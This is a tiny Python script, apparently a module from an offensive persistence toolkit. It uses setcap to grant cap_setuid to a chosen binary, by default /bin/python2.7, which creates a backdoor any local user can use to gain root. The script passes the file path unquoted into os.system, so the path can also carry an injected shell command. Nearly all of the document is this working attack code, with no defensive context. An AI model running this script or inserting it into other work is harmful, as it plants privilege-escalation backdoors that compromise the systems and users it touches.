#!/usr/bin/python3
#Capabilities SUID file
#PATH,no,Set path to file
#END
import os

def main(arguments):
    if arguments[0] == "":
        arguments[0] = "/bin/python2.7"
    os.system('setcap cap_setuid+ep ' + arguments[0])
